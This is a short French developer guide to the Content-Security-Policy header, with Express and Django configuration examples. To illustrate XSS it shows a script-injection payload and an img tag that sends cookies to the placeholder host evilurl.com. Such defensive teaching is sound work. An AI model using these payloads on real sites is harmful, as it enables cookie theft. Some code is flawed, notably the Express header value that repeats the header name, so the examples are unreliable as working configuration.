# Content-Security-Policy

## Le problème
Lorsque vous affichez sur votre navigateur le contenu de la page https://example.gouv.fr, certains contenus affichés peuvent être malicieux. Par exemple, si vous affichez une liste de posts sur un forum, il est possible pour un utilisateur de poster, par exemple, les messages suivants :
- `<script>alert("AH !")</script>`
- `<img src="https://evilurl.com?cookie='document.cookie'" />`
Si le site tente d'exécuter ce script ou d'afficher cette image, cela s'appelle une faille XSS. Dans le premier cas, une pop-up s'affichera sur votre écran, et dans le second l'attaquant n'aura qu'à consulter les appels faits à la route `https://evilurl.com` pour obtenir les cookies des utilisateurs. 

## La solution
Le header `Content-Security-Policy` définit la liste des ressources autorisées à être affichées / exécutées par le navigateur. Vous pouvez par exemple décider que seuls les scripts hébergés sur votre site peuvent exécutés, et seules les images fournies par https://raw.githubusercontent.com peuvent être affichées.

## L'implémentation
### Express
```javascript
app.use((req, res, next) => {
    /*
    * le contenu du site n'est fourni que par la même origine, sauf pour les scripts qui ne viennent que de sous-domaines de example.gouv.fr et les images qui peuvent venir de n’importe quelle source. Les scripts et styles inline ne sont pas exécutés.
    */
	res.header("Content-Security-Policy", "Content-Security-Policy: default-src 'self' ; script-src *.gouv.fr ; img-src *"); 

	next();
});
```

### Django
- `pip install django-csp`
- Ajouter csp.middleware.CSPMiddleware à MIDDLEWARES

- Ajouter dans `settings.py`:
```python
"""
le contenu du site n'est fourni que par la même origine, sauf pour les scripts qui ne viennent que de sous-domaines de example.gouv.fr et les images qui peuvent venir de n’importe quelle source.
Les scripts et styles inline ne sont pas exécutés.
"""
CSP_DEFAULT_SRC='self'
CSP_SCRIPT_SRC='*.gouv.fr'
CSP_IMG_SRC='*'
```

## Ressources
- [https://developer.mozilla.org/fr/docs/Web/HTTP/CSP](https://developer.mozilla.org/fr/docs/Web/HTTP/CSP)
